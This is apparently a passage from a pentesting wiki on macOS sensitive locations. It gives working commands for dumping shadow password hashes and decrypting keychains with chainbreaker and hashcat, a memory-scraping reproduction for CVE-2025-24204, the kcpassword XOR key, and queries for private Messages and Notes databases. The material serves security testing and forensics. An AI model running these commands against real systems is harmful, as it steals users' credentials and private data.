  \n### Shadow Passwords\n\nShadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\\\
  \nThe following oneliner can be use to dump **all the information about the users** (including hash info):\n\n```bash\n\
  for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r \"$l\" ];then echo \"$l\"; defaults read \"$l\"; fi; done\n```\n\
  \n[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git)\
  \ can be used to transform the hash to **hashcat** **format**.\n\nAn alternative one-liner which will dump creds of all\
  \ non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):\n\n```bash\nsudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users\
  \ -type f -regex \"[^_]*\"); do plutil -extract name.0 raw $i | awk \"{printf \\$0\\\":\\$ml\\$\\\"}\"; for j in {iterations,salt,entropy};\
  \ do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw\
  \ -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk \"{printf \\\"$\\\"\\$0}\";\
  \ fi; done; echo \"\"; done'\n```\n\nAnother way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl\
  \ . -read /Users/`whoami` ShadowHashData ``\n\n### /etc/master.passwd\n\nThis file is **only used** when the system id running\
  \ in **single-user mode** (so not very frequently).\n\n### Keychain Dump\n\nNote that when using the security binary to\
  \ **dump the passwords decrypted**, several prompts will ask the user to allow this operation.\n\n```bash\n#security\nsecurity\
  \ dump-trust-settings [-s] [-d] #List certificates\nsecurity list-keychains #List keychain dbs\nsecurity list-smartcards\
  \ #List smartcards\nsecurity dump-keychain | grep -A 5 \"keychain\" | grep -v \"version\" #List keychains entries\nsecurity\
  \ dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)\n```\n\n\
  ### [Keychaindump](https://github.com/juuso/keychaindump)\n\n> [!CAUTION]\n> Based on this comment [juuso/keychaindump#10\
  \ (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working\
  \ anymore in Big Sur.\n\n### Keychaindump Overview\n\nA tool named **keychaindump** has been developed to extract passwords\
  \ from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760).\
  \ The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits\
  \ the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it\
  \ without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump**\
  \ becomes ineffective.\n\n**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple\
  \ as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process\
  \ involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain\
  \ file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command,\
  \ looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory\
  \ locations:\n\n```bash\nsudo vmmap <securityd PID> | grep MALLOC_TINY\n```\n\nAfter identifying potential master keys,\
  \ **keychaindump** searches through the heaps for a specific pattern (`0x0000000000000018`) that indicates a candidate for\
  \ the master key. Further steps, including deobfuscation, are required to utilize this key, as outlined in **keychaindump**'s\
  \ source code. Analysts focusing on this area should note that the crucial data for decrypting the keychain is stored within\
  \ the memory of the **securityd** process. An example command to run **keychaindump** is:\n\n```bash\nsudo ./keychaindump\n\
  ```\n\n### chainbreaker\n\n[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following\
  \ types of information from an OSX keychain in a forensically sound manner:\n\n- Hashed Keychain password, suitable for\
  \ cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)\n- Internet\
  \ Passwords\n- Generic Passwords\n- Private Keys\n- Public Keys\n- X509 Certificates\n- Secure Notes\n- Appleshare Passwords\n\
  \nGiven the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility),\
  \ or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.\n\nWithout one of these methods\
  \ of unlocking the Keychain, Chainbreaker will display all other available information.\n\n#### **Dump keychain keys**\n\
  \n```bash\n#Dump all keys of the keychain (without the passwords)\npython2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain\n\
  ```\n\n#### **Dump keychain keys (with passwords) with SystemKey**\n\n```bash\n# First, get the keychain decryption key\n\
  # To get this decryption key you need to be root and SIP must be disabled\nhexdump -s 8 -n 24 -e '1/1 \"%.2x\"' /var/db/SystemKey\
  \ && echo\n## Use the previous key to decrypt the passwords\npython2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697\
  \ /Library/Keychains/System.keychain\n```\n\n#### **Dump keychain keys (with passwords) cracking the hash**\n\n```bash\n\
  # Get the keychain hash\npython2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain\n# Crack\
  \ it with hashcat\nhashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt\n# Use the key to decrypt the passwords\n\
  python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain\n\
  ```\n\n#### **Dump keychain keys (with passwords) with memory dump**\n\n[Follow these steps](../index.html#dumping-memory-with-osxpmem)\
  \ to perform a **memory dump**\n\n```bash\n#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain\
  \ passwords\n# Unformtunately volafox isn't working with the latest versions of MacOS\npython vol.py -i ~/Desktop/show/macosxml.mem\
  \ -o keychaindump\n\n#Try to extract the passwords using the extracted keychain passwords\npython2.7 chainbreaker.py --dump-all\
  \ --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain\n```\n\n#### **Dump keychain\
  \ keys (with passwords) using users password**\n\nIf you know the users password you can use it to **dump and decrypt keychains\
  \ that belong to the user**.\n\n```bash\n#Prompt to ask for the password\npython2.7 chainbreaker.py --dump-all --password-prompt\
  \ /Users/<username>/Library/Keychains/login.keychain-db\n```\n\n### Keychain master key via `gcore` entitlement (CVE-2025-24204)\n\
  \nmacOS 15.0 (Sequoia) shipped `/usr/bin/gcore` with the **`com.apple.system-task-ports.read`** entitlement, so any local\
  \ admin (or malicious signed app) could dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks\
  \ the **Keychain master key** in clear and lets you decrypt `login.keychain-db` without the user password.\n\n**Quick repro\
  \ on vulnerable builds (15.0–15.2):**\n\n```bash\nsudo pgrep securityd        # usually a single PID\nsudo gcore -o /tmp/securityd\
  \ $(pgrep securityd)   # produces /tmp/securityd.<pid>\npython3 - <<'PY'\nimport mmap,re,sys\nwith open('/tmp/securityd.'+sys.argv[1],'rb')\
  \ as f:\n    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)\n    for m in re.finditer(b'\\x00\\x00\\x00\\x00\\x00\\\
  x00\\x00\\x18.{96}',mm):\n        c=m.group(0)\n        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break\nPY $(pgrep\
  \ securityd)\n```\nFeed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed\
  \ the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable\
  \ binary.\n\n### kcpassword\n\nThe **kcpassword** file is a file that holds the **user’s login password**, but only if the\
  \ system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked\
  \ for a password (which isn't very secure).\n\nThe password is stored in the file **`/etc/kcpassword`** xored with the key\
  \ **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will\
  \ be reused.\\\nThis makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).\n\
  \n## Interesting Information in Databases\n\n### Messages\n\n```bash\nsqlite3 $HOME/Library/Messages/chat.db .tables\nsqlite3\
  \ $HOME/Library/Messages/chat.db 'select * from message'\nsqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'\n\
  sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'\nsqlite3 $HOME/Suggestions/snippets.db 'select *\
  \ from emailSnippets'\n```\n\n### Notifications\n\nYou can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`\n\
  \nMost of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform**\
  \ it to **human** **readable** or use **`strings`**. To access it you can do:\n\n```bash\ncd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/\n\
  strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack\n```\n\n#### Recent privacy issues\
  \ (NotificationCenter DB)\n\n- In macOS **14.7–15.1** Apple stored banner content in the `db2/db` SQLite without proper\
  \ redaction. CVEs **CVE-2024-44292/44293/40838/54504** allowed any local user to read other users' notification text just\
  \ by opening the DB (no TCC prompt). Fixed in **15.2** by moving/locking the DB; on older systems the above path still leaks\
  \ recent notifications and attachments.\n- The database is world-readable only on affected builds, so when hunting on legacy\
  \ endpoints copy it before updating to preserve artefacts.\n\n### Notes\n\nThe users **notes** can be found in `~/Library/Group\
  \ Containers/group.com.apple.notes/NoteStore.sqlite`\n\n```bash\nsqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite\
  \ .tables\n\n#To dump it in a readable format:\nfor i in $(sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite\
  \ \"select Z_PK from ZICNOTEDATA;\"); do sqlite3 ~/Library/Group\\ Containers/group.com.apple.notes/NoteStore.sqlite \"\
  select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';\"; zcat body1.gz.Z ; done\n```\n\n## Preferences\n\
  \nIn macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.\n\
  \nIn macOS the cli tool **`defaults`** can be used to **modify the Preferences file**.\n\n**`/usr/sbin/cfprefsd`** claims\
  \ the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such\
  \ as modify preferences.\n\n## OpenDirectory permissions.plist\n\nThe file `/System/Library/OpenDirectory/permissions.plist`\
  \ contains permissions applied on node attributes and is protected by SIP.\\\nThis file grants permissions to specific users\
  \ by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey`\
  \ and `KerberosKeys` among others:\n\n```xml\n[...]\n<key>dsRecTypeStandard:Computers</key>\n<dict>\n\t<key>dsAttrTypeNative:ShadowHashData</key>\n\
  \t<array>\n\t\t<dict>\n\t\t\t<!-- allow wheel even though it's implicit -->\n\t\t\t<key>uuid</key>\n\t\t\t<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>\n\
  \t\t\t<key>permissions</key>\n\t\t\t<array>\n\t\t\t\t<string>readattr</string>\n\t\t\t\t<string>writeattr</string>\n\t\t\
  \t</array>\n\t\t</dict>\n\t</array>\n\t<key>dsAttrTypeNative:KerberosKeys</key>\n\t<array>\n\t\t<dict>\n\t\t\t<!-- allow\
  \ wheel even though it's implicit -->\n\t\t\t<key>uuid</key>\n\t\t\t<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>\n\
  \t\t\t<key>permissions</key>\n\t\t\t<array>\n\t\t\t\t<string>readattr</string>\n\t\t\t\t<string>writeattr</string>\n\t\t\
  \t</array>\n\t\t</dict>\n\t</array>\n[...]\n```\n\n## System Notifications\n\n### Darwin Notifications\n\nThe main daemon\
  \ for notifications is **`/usr/sbin/notifyd`**. In order to receive notifications, clients must register through the `com.apple.system.notification_center`\
  \ Mach port (check them with `sudo lsmp -p <pid notifyd>`). The daemon is configurable with the file `/etc/notify.conf`.\n\
  \nThe names used for notifications are unique reverse DNS notations and when a notification is sent to one of them, the\
  \ client(s) that have indicated that can handle it will receive it.\n\nIt's possible to dump the current status (and see\
  \ all the names) sending the signal SIGUSR2 to the notifyd process and reading the generated file: `/var/run/notifyd_<pid>.status`:\n\
  \n```bash\nps -ef | grep -i notifyd\n    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd\n\nsudo kill -USR2\
  \ 376\n\ncat /var/run/notifyd_376.status\n[...]\npid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0\
  \   common 10\n  memory: com.apple.system.timezone\n  common: com.apple.analyticsd.running\n  common: com.apple.CFPreferences._domainsChangedExternally\n\
  \  common: com.apple.security.octagon.joined-with-bottle\n[...]\n```\n\n### Distributed Notification Center\n\nThe **Distributed\
  \ Notification Center** whose main binary is **`/usr/sbin/distnoted`**, is another way to send notifications. It exposes\
  \ some XPC services and it performs some check to try to verify clients.\n\n### Apple Push Notifications (APN)\n\nIn this\
  \ case, applications can register for **topics**. The client will generate a token contacting Apple's servers through **`apsd`**.\\\
  \nThen, providers, will have also generated a token and will be able to connect with Apple's servers to send messages to\
  \ the clients. These messages will be locally received by **`apsd`** which will relay the notification to the application\
  \ waiting for it.\n\nThe preferences are located in `/Library/Preferences/com.apple.apsd.plist`.\n\nThere is a local database\
  \ of messages located in macOS in `/Library/Application\\ Support/ApplePushService/aps.db` and in iOS in `/var/mobile/Library/ApplePushService`.\
  \ It has 3 tables: `incoming_messages`, `outgoing_messages` and `channel`.\n\n```bash\nsudo sqlite3 /Library/Application\\\
  \ Support/ApplePushService/aps.db\n```\n\nIt's also possible to get information about the daemon and connections using:\n\
  \n```bash\n/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status\n```\n\n## User Notifications\n\n\
  These are notifications that the user should see in the screen:\n\n- **`CFUserNotification`**: These API provides a way\
  \ to show in the screen a pop-up with a message.\n- **The Bulletin Board**: This shows in iOS a banner that disappears and\
  \ will be stored in the Notification Center.\n- **`NSUserNotificationCenter`**: This is the iOS bulletin board in MacOS.\
  \ The database with the notifications in located in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`\n\n\
